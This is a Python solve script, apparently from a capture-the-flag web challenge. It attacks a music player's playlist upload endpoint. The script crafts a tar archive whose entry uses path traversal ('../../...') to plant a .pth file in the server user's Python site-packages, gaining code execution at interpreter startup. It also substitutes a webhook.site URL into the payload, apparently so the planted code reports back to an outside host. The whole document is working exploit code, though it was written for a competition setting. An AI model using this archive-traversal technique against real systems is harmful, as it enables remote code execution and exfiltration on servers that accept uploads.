import os
import shutil
import tarfile
import tempfile
from pathlib import Path

import requests

#TARGET_URL = "http://localhost:1337/"
TARGET_URL = "https://musicplayer-319f6433265c9ca8.instancer.b01lersc.tf/"
WEBHOOK_URL = "https://webhook.site/5544244d-6f21-4e4d-b2c7-423cfd4ae019"

orig_dir = Path(__file__).parent
with tempfile.TemporaryDirectory() as dir:
	os.chdir(dir)
	shutil.copy(orig_dir / "solve.pth", ".")

	with open("solve.pth", "r+") as f:
		x = f.read().replace("WEBHOOK_URL", WEBHOOK_URL)
		f.seek(0)
		f.write(x)
	with tarfile.open("out1.tar", "w") as tf:
		tf.add(
			"solve.pth",
			"../../../../../../../../../../home/ctf/.local/lib/python3.11/site-packages/solve.pth",
		)

	(Path(dir) / "empty.py").touch()
	with tarfile.open("out2.tar", "w") as tf:
		tf.add(
			"empty.py",
		)

	with open("out1.tar", "rb") as f:
		requests.post(
			TARGET_URL + "/api/playlists/upload", data={"title": "a"}, files={"videos": f}
		)
	with open("out2.tar", "rb") as f:
		requests.post(
			TARGET_URL + "/api/playlists/upload", data={"title": "a"}, files={"videos": f}
		)
